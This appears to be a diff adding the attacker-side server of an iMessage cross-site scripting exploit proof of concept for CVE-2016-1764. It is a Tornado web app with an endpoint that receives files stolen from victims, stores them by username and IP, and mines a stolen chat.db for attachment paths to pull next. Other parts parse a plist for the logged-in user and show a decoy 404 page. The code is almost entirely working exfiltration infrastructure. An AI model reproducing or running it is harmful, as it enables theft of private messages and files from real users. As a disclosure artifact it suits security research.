@@ -1,0 +1,89 @@
+#!/usr/bin/env python
+
+#
+#  iMessage XSS Exploit Proof of Concept
+#            CVE-2016-1764
+#
+# @authors: moloch, mandatory, and shubs
+# pylint: disable=W0223,W0221,C0111
+
+import tornado.options
+import tornado.web
+import sqlite3
+import json
+import os
+
+from tornado.ioloop import IOLoop
+from biplist import readPlist
+from cStringIO import StringIO
+
+
+class MainHandler(tornado.web.RequestHandler):
+
+    """ Go away! """
+
+    def get(self):
+        self.set_header("Server", "Totally Not a Malicious Server")
+        self.set_status(404)
+        self.write("Nothing to see here, move along.")
+
+
+class ExfiltrateHandler(tornado.web.RequestHandler):
+
+    """ Handles the file uploads, with minimal user tracking """
+
+    EXFIL_PATH = os.path.abspath("./exfiltrated_files/")
+
+    def post(self, username, filename):
+
+        filename = os.path.basename(filename)
+        raw_data = self.request.body
+
+        user = username + "_" + str(self.request.remote_ip).replace(".", "_")
+        user_path = os.path.join(self.EXFIL_PATH, os.path.basename(user))
+        user_directory = os.path.join(os.getcwd(), user_path)
+
+        if not os.path.isdir(user_directory):
+            os.makedirs(user_directory)
+
+        file_path = os.path.join(user_directory, filename)
+        with open(file_path, "w") as file_handler:
+            file_handler.write(raw_data)
+
+        if filename.lower() == "chat.db":
+            conn = sqlite3.connect(file_path)
+            dbc = conn.cursor()
+            dbc.execute("SELECT filename FROM attachment")
+            filename_rows = [item[0] for item in dbc.fetchall()]
+            final_list = []
+            for attachment_filename in filename_rows:
+                attachment_filename = attachment_filename.replace("~", "")
+                final_list.append(attachment_filename)
+            conn.close()
+            self.write(json.dumps(final_list))
+
+
+class UserPlistHandler(tornado.web.RequestHandler):
+
+    """ Parses the plist and returns the currently logged in user """
+
+    def post(self):
+        plist = readPlist(StringIO(self.request.body))
+        self.set_header("Content-type", "text/plain")
+        self.write(plist["lastUserName"])
+
+
+def make_app(debug=False):
+    return tornado.web.Application([
+        (r"/", MainHandler),
+        (r"/plist", UserPlistHandler),
+        (r"/f/(.*)", tornado.web.StaticFileHandler, {"path": "./static/"}),
+        (r"/exfiltrate/([a-zA-Z0-9]+)/(.*)", ExfiltrateHandler),
+    ], debug=debug)
+
+
+if __name__ == "__main__":
+    tornado.options.parse_command_line()
+    APP = make_app()
+    APP.listen(8888)
+    IOLoop.current().start()
